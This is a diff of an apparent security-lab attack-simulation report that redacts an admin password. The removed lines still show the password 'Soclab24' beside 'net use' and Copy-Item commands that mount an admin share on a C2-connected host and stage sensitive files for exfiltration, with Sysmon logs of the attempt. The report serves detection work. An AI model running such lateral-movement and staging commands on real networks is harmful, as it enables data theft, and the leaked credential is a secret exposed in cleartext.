@@ -47,7 +47,7 @@
 **Execution:**
 ```powershell
 # Mount admin share on COMPROMISED-HOST-01
-net use \\10.10.10.103\C$ /user:wadmin Soclab24
+net use \\10.10.10.103\C$ /user:wadmin [REDACTED]
 
 # Copy IT-sensitive files to destination staging directory
 Copy-Item -Path "C:\Windows\Temp\agc065_collected\*" -Destination "\\10.10.10.103\C$\Windows\Temp\agc065_incoming\" -Recurse
@@ -68,13 +68,13 @@ UtcTime: 2026-09-15 22:55:42.819
 ProcessGuid: {bf260c57-ccee-6aa9-5e01-000000000e00}
 ProcessId: 5012
 Image: C:\Windows\System32\net.exe
-CommandLine: "C:\WINDOWS\system32\net.exe" use \\10.10.10.103\C$ /user:wadmin Soclab24
+CommandLine: "C:\WINDOWS\system32\net.exe" use \\10.10.10.103\C$ /user:wadmin [REDACTED]
 User: WIN-CLIENT-02\Administrator
 IntegrityLevel: High
 Hashes: MD5=8A1E71312BD2AAE202652113049CDBD1
 ```
 
-**Critical finding:** Local admin credentials (`wadmin` / `Soclab24`) exposed in cleartext in the CommandLine field. Same credential exposure pattern as AGC-060.
+**Critical finding:** Local admin credentials (`wadmin` / `[REDACTED]`) exposed in cleartext in the CommandLine field. Same credential exposure pattern as AGC-060.
 
 **Sysmon EID 1 -- PowerShell orchestration:**
 ```
@@ -151,7 +151,7 @@ Screenshots: not applicable (text-based evidence collection only).
 ```
 Source:      WIN-CLIENT-02 (10.10.10.102, raj.patel IT-Support)
 Destination: COMPROMISED-HOST-01 (10.10.10.103, C2-connected)
-Method:      net use \\10.10.10.103\C$ /user:wadmin Soclab24
+Method:      net use \\10.10.10.103\C$ /user:wadmin [REDACTED]
 Result:      Error 67 (admin shares blocked in lab)
 Intent:      Stage 6 IT-sensitive files on exfil endpoint
 
